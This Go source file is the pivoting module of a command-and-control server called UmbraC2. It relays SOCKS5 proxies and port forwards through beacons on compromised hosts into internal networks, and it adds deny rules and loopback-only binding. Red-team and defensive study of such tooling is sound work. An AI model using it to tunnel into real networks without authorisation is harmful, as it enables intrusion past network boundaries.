// Package pivot implements agent-assisted pivoting.
//
// A beacon that can reach the team server opens a *callback session*: the
// server asks the agent (with a `tunnel` task) to dial back, and the agent
// answers on the agent listener with a HELLO that carries the tunnel session
// id. The two ends then multiplex logical streams over that one connection:
//
//	server -> agent   TUNNEL_OPEN  {stream, op:"open",   host, port}
//	agent  -> server  TUNNEL_OPEN  {stream, op:"result", ok, err}
//	both              TUNNEL_DATA  {stream, data}
//	both              TUNNEL_CLOSE {stream, reason}
//
// On top of that the package exposes the two things an operator actually
// wants: a SOCKS5 proxy and a plain TCP port forward. Both bind to loopback
// by default, because a pivot that listens on every interface is an ingress
// into the internal network for anybody who can reach the server.
//
// The callback is agent-initiated on purpose: it works from inside networks
// where the team server cannot reach the agent, and it survives the agent
// being behind NAT.
package pivot

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// TaskKindTunnel is the task kind that asks a beacon to open a callback
// session with the team server.
const TaskKindTunnel = "tunnel"

// Modes a tunnel can run in.
const (
	// ModeSOCKS exposes a SOCKS5 proxy: the client picks the target.
	ModeSOCKS = "socks"
	// ModeForward forwards a local port to one fixed remote host:port.
	ModeForward = "forward"
)

// The ways a pivot resolves a name.
const (
	// DNSRemote lets the target resolve the name.  The name of an
	// internal host never leaves the network it belongs to, because the
	// server never sees it.
	DNSRemote = "remote"
	// DNSLocal resolves the name on the server before the agent connects.
	DNSLocal = "local"
)

// Limits. They are deliberately small: every open stream costs a file
// descriptor on the agent and a goroutine here.
const (
	// MaxSessions bounds the number of agents that may hold a session.
	MaxSessions = 64
	// MaxStreamsPerSession bounds the concurrent streams of one session.
	MaxStreamsPerSession = 128
	// MaxPendingOpens bounds the number of unanswered tunnel requests.
	MaxPendingOpens = 32
	// OpenTimeout is how long the server waits for the agent to dial back.
	OpenTimeout = 30 * time.Second
	// StreamTimeout is how long the server waits for a stream to be opened.
	StreamTimeout = 30 * time.Second
	// ChunkSize is the payload size of one TUNNEL_DATA frame.
	ChunkSize = 32 * 1024
	// StreamBuffer is how many chunks may queue for one stream.
	StreamBuffer = 64
)

// FrameStream is the transport a tunnel session needs. link.FrameStream
// satisfies it, which keeps this package independent of the transports.
type FrameStream interface {
	ReadFrame() ([]byte, error)
	WriteFrame(frame []byte) error
}

// TunnelInfo is the operator-visible description of one tunnel.
type TunnelInfo struct {
	Stream    string    `json:"stream"`
	AgentID   string    `json:"agent_id"`
	Mode      string    `json:"mode"`
	Listen    string    `json:"listen"`
	Host      string    `json:"host,omitempty"`
	Port      int       `json:"port,omitempty"`
	Opened    time.Time `json:"opened"`
	Streams   int       `json:"streams"`
	BytesUp   int64     `json:"bytes_up"`
	BytesDown int64     `json:"bytes_down"`
	State     string    `json:"state"`
	// Claim is the name the operator gave to this pivot.  Releasing the
	// claim tears the pivot down.
	Claim string `json:"claim,omitempty"`
	// Through is the agent this pivot is chained through.  It is empty
	// for the first hop and names the previous agent for the others.
	Through string `json:"through,omitempty"`
	// DNS is "remote" when the target resolves the name and "local" when
	// the server resolves it before the agent connects.
	DNS string `json:"dns,omitempty"`
	// LastActivity is when the pivot moved bytes the last time.
	LastActivity time.Time `json:"last_activity"`
}

// Options are the settings of one pivot.
type Options struct {
	// Mode is "socks" (the client picks the target) or "forward" (the
	// target is fixed).
	Mode string
	// Host and Port are the target of a forward.
	Host string
	Port int
	// Listen is the local bind address.  The default is a random
	// loopback port.
	Listen string
	// DNS is "remote" (the target resolves the name) or "local" (the
	// server resolves it).  The default is "remote": the name of an
	// internal host must not leave the network it belongs to.
	DNS string
	// Loopback forces the listener onto the loopback of the server, no
	// matter what the operator asked for.  A pivot that listens on every
	// interface is an ingress into the internal network.
	Loopback bool
	// Claim is the name the operator gave to this pivot.
	Claim string
	// Through is the agent this pivot is chained through.
	Through string
	// User and Password are the credentials the SOCKS5 proxy asks for.
	// An empty user means the proxy is open to everybody who can reach
	// its listener.
	User     string
	Password string
}

// Manager owns every tunnel, tunnel session and local listener.
type Manager struct {
	hub *hub.Hub
	log *slog.Logger

	mu       sync.Mutex
	sessions map[string]*tunnelSession // agent id -> callback session
	tunnels  map[string]*tunnel         // tunnel id -> tunnel
	pending  map[string]*pendingOpen    // agent id -> unanswered request
	closed   bool

	// claims maps the name of a claim to the tunnels it holds.  The
	// operator releases a claim to tear every tunnel of it down.
	claims map[string][]string
	// clients is the accounting of the SOCKS5 clients.
	clients map[string]*clientAccount
	// connections is the log of the last connections of the proxy.
	connections []connectionRecord
	// deny is the list of hosts and ports the proxy refuses.
	deny []denyRule
}

// New creates a pivot manager.
func New(h *hub.Hub, log *slog.Logger) *Manager {
	if log == nil {
		log = slog.Default()
	}
	return &Manager{
		hub:      h,
		log:      log,
		sessions: make(map[string]*tunnelSession),
		tunnels:  make(map[string]*tunnel),
		pending:  make(map[string]*pendingOpen),
		claims:   make(map[string][]string),
		clients:  make(map[string]*clientAccount),
	}
}

// SetDeny installs the list of hosts and ports the proxy refuses.
//
// The rule is a host and a port; a port of zero matches every port of the
// host.  A name matches the names the client asked for, an address matches
// the address the server resolved.
func (m *Manager) SetDeny(rules []DenyRule) {
	m.mu.Lock()
	m.deny = nil
	for _, rule := range rules {
		host := strings.TrimSpace(rule.Host)
		if host == "" {
			continue
		}
		m.deny = append(m.deny, denyRule{host: host, port: rule.Port})
	}
	m.mu.Unlock()
}

// Open creates a tunnel through agentID and starts its local listener.
//
// The mode is "socks" (the client picks the target) or "forward" (the
// target is fixed).  The listen address is the local bind address; the
// default is a random loopback port, and the caller learns the real
// address from the returned TunnelInfo.
//
// The listener is bound before the agent is asked for a session: a pivot
// that is not listening yet is a pivot an operator cannot use, and the
// session is only needed when the first connection arrives.  That is also
// what lets a forward survive the re-connect of its agent.
func (m *Manager) Open(agentID string, opt Options) (*TunnelInfo, error) {
	mode := opt.Mode
	switch mode {
	case "":
		mode = ModeSOCKS
	case ModeSOCKS, ModeForward:
	default:
		return nil, fmt.Errorf("pivot: unknown mode %q", mode)
	}
	if agentID == "" {
		return nil, errors.New("pivot: an agent id is required")
	}
	if mode == ModeForward {
		if opt.Host == "" {
			return nil, errors.New("pivot: forward mode needs a remote host")
		}
		if opt.Port <= 0 || opt.Port > 65535 {
			return nil, errors.New("pivot: forward mode needs a valid remote port")
		}
	}
	dns := opt.DNS
	switch dns {
	case "":
		dns = DNSRemote
	case DNSRemote, DNSLocal:
	default:
		return nil, fmt.Errorf("pivot: unknown dns mode %q", dns)
	}
	listen := opt.Listen
	if listen == "" {
		listen = "127.0.0.1:0"
	}
	if opt.Loopback {
		listen = forceLoopback(listen)
	}
	ln, err := net.Listen("tcp", listen)
	if err != nil {
		return nil, fmt.Errorf("pivot: listen %s: %w", listen, err)
	}
	now := time.Now().UTC()
	tun := &tunnel{
		id:          newID("tun"),
		agentID:     agentID,
		mode:        mode,
		host:        opt.Host,
		port:        opt.Port,
		opened:      now,
		lastActive:  now,
		state:       "open",
		dns:         dns,
		claim:       opt.Claim,
		through:     opt.Through,
		user:        opt.User,
		password:    opt.Password,
	}
	tun.listener = ln
	tun.listen = ln.Addr().String()

	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		_ = ln.Close()
		return nil, errors.New("pivot: the manager is shutting down")
	}
	m.tunnels[tun.id] = tun
	if tun.claim != "" {
		m.claims[tun.claim] = append(m.claims[tun.claim], tun.id)
	}
	m.mu.Unlock()

	go m.serve(tun)
	m.log.Info("pivot tunnel opened", "tunnel", tun.id, "agent", agentID,
		"mode", mode, "listen", tun.listen, "claim", tun.claim)
	m.hub.Emit(hub.Event{Kind: "pivot.opened", AgentID: agentID, Data: map[string]any{
		"tunnel": tun.id, "mode": mode, "listen": tun.listen,
		"host": opt.Host, "port": int64(opt.Port), "claim": tun.claim,
		"through": tun.through, "dns": dns,
	}})
	return m.info(tun), nil
}

// forceLoopback turns a bind address into one on the loopback.
//
// The port is kept, so a forward that was asked for a port keeps it; only
// the address changes.  A bind address without a port gets a random one.
func forceLoopback(listen string) string {
	host, port, err := net.SplitHostPort(listen)
	if err != nil {
		return "127.0.0.1:0"
	}
	if port == "" {
		port = "0"
	}
	return net.JoinHostPort("127.0.0.1", port)
}

// Close tears a tunnel down and releases its listener.
func (m *Manager) Close(id string) error {
	m.mu.Lock()
	tun, ok := m.tunnels[id]
	if ok {
		delete(m.tunnels, id)
		m.dropClaimLocked(tun)
	}
	m.mu.Unlock()
	if !ok {
		return errors.New("pivot: unknown tunnel")
	}
	if tun.listener != nil {
		_ = tun.listener.Close()
	}
	tun.setState("closed")
	m.log.Info("pivot tunnel closed", "tunnel", tun.id, "agent", tun.agentID)
	m.hub.Emit(hub.Event{Kind: "pivot.closed", AgentID: tun.agentID, Data: map[string]any{
		"tunnel": tun.id,
	}})
	return nil
}

// List returns every open tunnel.
func (m *Manager) List() []TunnelInfo {
	m.mu.Lock()
	tunnels := make([]*tunnel, 0, len(m.tunnels))
	for _, t := range m.tunnels {
		tunnels = append(tunnels, t)
	}
	m.mu.Unlock()
	out := make([]TunnelInfo, 0, len(tunnels))
	for _, t := range tunnels {
		out = append(out, m.info(t))
	}
	return out
}

// Sessions reports how many agents currently hold a callback session.
func (m *Manager) Sessions() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.sessions)
}

// CloseAll shuts every tunnel and session down.
func (m *Manager) CloseAll() {
	m.mu.Lock()
	tunnels := m.tunnels
	sessions := m.sessions
	m.tunnels = make(map[string]*tunnel)
	m.sessions = make(map[string]*tunnelSession)
	m.pending = make(map[string]*pendingOpen)
	m.claims = make(map[string][]string)
	m.closed = true
	m.mu.Unlock()
	for _, t := range tunnels {
		if t.listener != nil {
			_ = t.listener.Close()
		}
	}
	for _, s := range sessions {
		s.shutdown()
	}
}

// Attach registers a callback session an agent opened.
//
// The link layer calls this after a handshake whose HELLO carried a tunnel
// session id; the session then owns the connection until it fails.
func (m *Manager) Attach(agentID, sid string, stream FrameStream, sess *session.Session) (<-chan struct{}, error) {
	ts := &tunnelSession{
		mgr:     m,
		agentID: agentID,
		sid:     sid,
		stream:  stream,
		sess:    sess,
		streams: make(map[string]*tunnelStream),
		ready:   make(chan struct{}),
		done:    make(chan struct{}),
	}
	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		return nil, errors.New("pivot: the manager is shutting down")
	}
	if len(m.sessions) >= MaxSessions {
		m.mu.Unlock()
		return nil, errors.New("pivot: too many tunnel sessions")
	}
	if _, exists := m.sessions[agentID]; exists {
		m.mu.Unlock()
		return nil, errors.New("pivot: this agent already holds a tunnel session")
	}
	m.sessions[agentID] = ts
	p, ok := m.pending[agentID]
	if ok && p.sid == sid {
		delete(m.pending, agentID)
	}
	m.mu.Unlock()

	if ok && p.sid == sid {
		close(p.ready)
	}
	go ts.readLoop()
	m.log.Info("tunnel session attached", "agent", agentID, "sid", sid)
	return ts.done, nil
}

// session returns a ready callback session for agentID, asking the agent to
// open one when there is none.
func (m *Manager) session(agentID string) (*tunnelSession, error) {
	m.mu.Lock()
	ts, ok := m.sessions[agentID]
	m.mu.Unlock()
	if ok {
		select {
		case <-ts.ready:
			return ts, nil
		default:
		}
	}

	sid := newID("sid")
	p := &pendingOpen{sid: sid, ready: make(chan struct{})}
	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		return nil, errors.New("pivot: the manager is shutting down")
	}
	if len(m.pending) >= MaxPendingOpens {
		m.mu.Unlock()
		return nil, errors.New("pivot: too many pending tunnel requests")
	}
	m.pending[agentID] = p
	m.mu.Unlock()

	// Whatever happens, the pending entry must not outlive this call.
	defer func() {
		m.mu.Lock()
		if m.pending[agentID] == p {
			delete(m.pending, agentID)
		}
		m.mu.Unlock()
	}()

	if _, err := m.hub.SubmitTask(agentID, TaskKindTunnel, upk.Map{"stream": sid}); err != nil {
		return nil, err
	}
	select {
	case <-p.ready:
	case <-time.After(OpenTimeout):
		return nil, errors.New("pivot: the agent did not open a tunnel session in time")
	}

	m.mu.Lock()
	ts = m.sessions[agentID]
	m.mu.Unlock()
	if ts == nil {
		return nil, errors.New("pivot: the agent opened an unknown tunnel session")
	}
	select {
	case <-ts.ready:
		return ts, nil
	case <-time.After(OpenTimeout):
		return nil, errors.New("pivot: the agent did not confirm the tunnel session in time")
	}
}

// serve accepts local connections and turns each of them into a stream.
//
// The session of the agent is not held here: it is taken when a
// connection arrives and taken again when the agent re-connects, so a
// forward outlives the session it was opened with.
func (m *Manager) serve(tun *tunnel) {
	for {
		conn, err := tun.listener.Accept()
		if err != nil {
			return
		}
		go m.handle(tun, conn)
	}
}

// handle proxies one local connection through the agent.
func (m *Manager) handle(tun *tunnel, conn net.Conn) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(2 * time.Minute))

	var (
		host string
		port int
	)
	if tun.mode == ModeForward {
		host, port = tun.host, tun.port
	} else {
		h, p, err := socks5Handshake(conn, tun.user, tun.password)
		if err != nil {
			m.log.Debug("socks5 handshake failed", "tunnel", tun.id, "err", err)
			return
		}
		host, port = h, p
	}
	client := conn.RemoteAddr().String()
	if addr, _, err := net.SplitHostPort(client); err == nil {
		client = addr
	}
	if m.denied(host, port) {
		m.log.Warn("pivot refused a denied target", "tunnel", tun.id,
			"host", host, "port", port, "client", client)
		if tun.mode == ModeSOCKS {
			_ = socks5Reply(conn, socks5NotAllowed, "0.0.0.0", 0)
		}
		m.noteConnection(client, host, port, 0, 0, "denied")
		m.hub.Emit(hub.Event{Kind: "pivot.denied", AgentID: tun.agentID,
			Data: map[string]any{"tunnel": tun.id, "host": host, "port": int64(port)}})
		return
	}
	// The name of an internal host must not leave the network it belongs
	// to: the agent resolves it when the pivot is in the remote mode.
	if tun.dns == DNSLocal && net.ParseIP(host) == nil {
		if addrs, err := net.LookupIP(host); err == nil && len(addrs) > 0 {
			host = addrs[0].String()
		}
	}

	sess, err := m.session(tun.agentID)
	if err != nil {
		m.log.Warn("pivot has no session", "tunnel", tun.id, "err", err)
		if tun.mode == ModeSOCKS {
			_ = socks5Reply(conn, socks5GeneralFailure, "0.0.0.0", 0)
		}
		m.noteConnection(client, host, port, 0, 0, "no session")
		return
	}

	stream, err := sess.openStream(host, port)
	if err != nil {
		m.log.Warn("pivot stream failed", "tunnel", tun.id, "host", host, "err", err)
		if tun.mode == ModeSOCKS {
			_ = socks5Reply(conn, 0x01, "0.0.0.0", 0)
		}
		m.hub.Emit(hub.Event{Kind: "pivot.error", AgentID: tun.agentID, Data: map[string]any{
			"tunnel": tun.id, "host": host, "port": int64(port), "err": err.Error(),
		}})
		m.noteConnection(client, host, port, 0, 0, "refused")
		return
	}
	tun.addStream(1)
	defer tun.addStream(-1)
	defer stream.close()

	if tun.mode == ModeSOCKS {
		if err := socks5Reply(conn, 0x00, "0.0.0.0", 0); err != nil {
			return
		}
	}
	// The deadline above only guards the handshake; a relayed stream is
	// allowed to idle.
	_ = conn.SetDeadline(time.Time{})

	// The bytes of this connection, so the log knows what the client
	// moved and not only what the tunnel moved in total.
	var up, down atomic.Int64

	// local -> agent
	go func() {
		buf := make([]byte, ChunkSize)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := stream.write(buf[:n]); werr != nil {
					break
				}
				tun.addUp(int64(n))
				up.Add(int64(n))
			}
			if err != nil {
				break
			}
		}
		stream.closeWrite()
	}()

	// agent -> local
	buf := make([]byte, ChunkSize)
	for {
		n, err := stream.read(buf)
		if n > 0 {
			if _, werr := conn.Write(buf[:n]); werr != nil {
				break
			}
			tun.addDown(int64(n))
			down.Add(int64(n))
		}
		if err != nil {
			break
		}
	}
	m.noteConnection(client, host, port, up.Load(), down.Load(), "closed")
}

// info snapshots a tunnel.
func (m *Manager) info(tun *tunnel) TunnelInfo {
	tun.mu.Lock()
	defer tun.mu.Unlock()
	return TunnelInfo{
		Stream:      tun.id,
		AgentID:     tun.agentID,
		Mode:        tun.mode,
		Listen:      tun.listen,
		Host:        tun.host,
		Port:        tun.port,
		Opened:      tun.opened,
		Streams:     tun.streams,
		BytesUp:     tun.bytesUp,
		BytesDown:   tun.bytesDown,
		State:       tun.state,
		Claim:       tun.claim,
		Through:     tun.through,
		DNS:         tun.dns,
		LastActivity: tun.lastActive,
	}
}

// tunnel is one operator-visible pivot.
type tunnel struct {
	id       string
	agentID  string
	mode     string
	listen   string
	host     string
	port     int
	opened   time.Time
	listener net.Listener

	// claim is the name the operator gave to this pivot.
	claim string
	// through is the agent this pivot is chained through.
	through string
	// dns is "remote" or "local".
	dns string
	// user and password are the credentials of the SOCKS5 proxy.
	user     string
	password string

	mu         sync.Mutex
	streams    int
	bytesUp    int64
	bytesDown  int64
	state      string
	lastActive time.Time
}

func (t *tunnel) addStream(delta int) {
	t.mu.Lock()
	t.streams += delta
	t.mu.Unlock()
}

func (t *tunnel) addUp(n int64) {
	t.mu.Lock()
	t.bytesUp += n
	t.lastActive = time.Now().UTC()
	t.mu.Unlock()
}

func (t *tunnel) addDown(n int64) {
	t.mu.Lock()
	t.bytesDown += n
	t.lastActive = time.Now().UTC()
	t.mu.Unlock()
}

func (t *tunnel) setState(s string) {
	t.mu.Lock()
	t.state = s
	t.mu.Unlock()
}

// pendingOpen is an unanswered request for a callback session.
type pendingOpen struct {
	sid   string
	ready chan struct{}
}

// tunnelSession is one agent callback connection.
type tunnelSession struct {
	mgr     *Manager
	agentID string
	sid     string
	stream  FrameStream
	sess    *session.Session

	// writeMu serialises sealing and writing: two goroutines may send at
	// the same time, and the peer insists on strictly increasing nonces.
	writeMu sync.Mutex

	mu        sync.Mutex
	streams   map[string]*tunnelStream
	readyOnce sync.Once
	ready     chan struct{}
	done      chan struct{}
	closeOnce sync.Once
}

// readLoop owns the callback connection.
func (ts *tunnelSession) readLoop() {
	defer ts.shutdown()
	for {
		raw, err := ts.stream.ReadFrame()
		if err != nil {
			return
		}
		msgType, msg, err := ts.sess.OpenMessage(raw)
		if err != nil {
			ts.mgr.log.Warn("tunnel frame rejected", "agent", ts.agentID, "err", err)
			return
		}
		switch msgType {
		case wire.MsgTunnelOpen:
			ts.onOpen(msg)
		case wire.MsgTunnelData:
			ts.onData(msg)
		case wire.MsgTunnelClose:
			ts.onClose(msg)
		case wire.MsgPadding:
			// padding frames carry nothing
		default:
			ts.mgr.log.Debug("unexpected frame on a tunnel session",
				"agent", ts.agentID, "type", wire.TypeName(msgType))
		}
	}
}

// send seals and writes one frame in a single critical section.
func (ts *tunnelSession) send(msgType byte, body any) error {
	ts.writeMu.Lock()
	defer ts.writeMu.Unlock()
	frame, err := ts.sess.Encrypt(msgType, body)
	if err != nil {
		return err
	}
	return ts.stream.WriteFrame(frame)
}

func (ts *tunnelSession) onOpen(msg map[string]any) {
	op, _ := msg["op"].(string)
	id, _ := msg["stream"].(string)
	switch op {
	case "ready":
		ts.readyOnce.Do(func() { close(ts.ready) })
	case "result":
		ok, _ := msg["ok"].(bool)
		text, _ := msg["err"].(string)
		ts.mu.Lock()
		st := ts.streams[id]
		ts.mu.Unlock()
		if st == nil {
			return
		}
		if ok {
			st.result <- nil
			return
		}
		if text == "" {
			text = "the agent refused the stream"
		}
		st.result <- errors.New(text)
	}
}

func (ts *tunnelSession) onData(msg map[string]any) {
	id, _ := msg["stream"].(string)
	data, _ := msg["data"].([]byte)
	ts.mu.Lock()
	st := ts.streams[id]
	ts.mu.Unlock()
	if st == nil {
		return
	}
	select {
	case st.data <- data:
	case <-st.closed:
	default:
		// The agent is faster than the consumer. Dropping the stream is
		// better than buffering without bound.
		st.closeWith("pivot: the stream buffer overflowed")
	}
}

func (ts *tunnelSession) onClose(msg map[string]any) {
	id, _ := msg["stream"].(string)
	reason, _ := msg["reason"].(string)
	ts.mu.Lock()
	st := ts.streams[id]
	ts.mu.Unlock()
	if st == nil {
		return
	}
	if reason == "" {
		reason = "the agent closed the stream"
	}
	st.closeWith(reason)
}

// openStream asks the agent to open a connection to host:port.
func (ts *tunnelSession) openStream(host string, port int) (*tunnelStream, error) {
	id := newID("s")
	st := &tunnelStream{
		id:     id,
		sess:   ts,
		result: make(chan error, 1),
		data:   make(chan []byte, StreamBuffer),
		closed: make(chan struct{}),
	}
	ts.mu.Lock()
	if len(ts.streams) >= MaxStreamsPerSession {
		ts.mu.Unlock()
		return nil, errors.New("pivot: too many streams on this session")
	}
	ts.streams[id] = st
	ts.mu.Unlock()

	body := upk.Map{"stream": id, "op": "open", "host": host, "port": int64(port)}
	if err := ts.send(wire.MsgTunnelOpen, body); err != nil {
		ts.dropStream(id)
		return nil, err
	}
	select {
	case err := <-st.result:
		if err != nil {
			ts.dropStream(id)
			return nil, err
		}
	case <-time.After(StreamTimeout):
		ts.dropStream(id)
		return nil, errors.New("pivot: the agent did not answer the stream request")
	case <-ts.done:
		ts.dropStream(id)
		return nil, errors.New("pivot: the tunnel session closed")
	}
	return st, nil
}

func (ts *tunnelSession) dropStream(id string) {
	ts.mu.Lock()
	delete(ts.streams, id)
	ts.mu.Unlock()
}

// shutdown closes the session and every stream on it.
func (ts *tunnelSession) shutdown() {
	ts.closeOnce.Do(func() {
		ts.mgr.mu.Lock()
		if cur, ok := ts.mgr.sessions[ts.agentID]; ok && cur == ts {
			delete(ts.mgr.sessions, ts.agentID)
		}
		ts.mgr.mu.Unlock()

		ts.mu.Lock()
		streams := ts.streams
		ts.streams = make(map[string]*tunnelStream)
		ts.mu.Unlock()
		for _, st := range streams {
			st.closeWith("pivot: the tunnel session closed")
		}
		close(ts.done)
		ts.mgr.log.Info("tunnel session closed", "agent", ts.agentID, "sid", ts.sid)
		ts.mgr.hub.Emit(hub.Event{Kind: "pivot.session_closed", AgentID: ts.agentID,
			Data: map[string]any{"session": ts.sid}})
	})
}

// tunnelStream is one logical stream inside a tunnel session.
type tunnelStream struct {
	id     string
	sess   *tunnelSession
	result chan error
	data   chan []byte
	closed chan struct{}

	once   sync.Once
	mu     sync.Mutex
	reason string
}

// write forwards bytes to the agent.
func (st *tunnelStream) write(data []byte) error {
	if len(data) == 0 {
		return nil
	}
	body := upk.Map{"stream": st.id, "data": data}
	return st.sess.send(wire.MsgTunnelData, body)
}

// closeWrite tells the agent that this side is done sending.
func (st *tunnelStream) closeWrite() {
	body := upk.Map{"stream": st.id, "reason": "local side closed"}
	_ = st.sess.send(wire.MsgTunnelClose, body)
}

// read returns the next chunk from the agent.
func (st *tunnelStream) read(buf []byte) (int, error) {
	select {
	case chunk := <-st.data:
		if len(chunk) == 0 {
			return 0, io.EOF
		}
		n := copy(buf, chunk)
		return n, nil
	case <-st.closed:
		// Drain whatever is still buffered before reporting the close.
		select {
		case chunk := <-st.data:
			n := copy(buf, chunk)
			return n, nil
		default:
			return 0, io.EOF
		}
	}
}

// close tears the stream down.
func (st *tunnelStream) close() {
	st.closeWith("closed")
}

// closeWith tears the stream down and remembers why.
func (st *tunnelStream) closeWith(reason string) {
	st.once.Do(func() {
		st.mu.Lock()
		st.reason = reason
		st.mu.Unlock()
		close(st.closed)
		st.sess.dropStream(st.id)
	})
}

// newID returns a short random identifier.
func newID(prefix string) string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return prefix + "-" + fmt.Sprintf("%012x", time.Now().UnixNano()&0xffffffffffff)
	}
	return prefix + "-" + hex.EncodeToString(b)
}
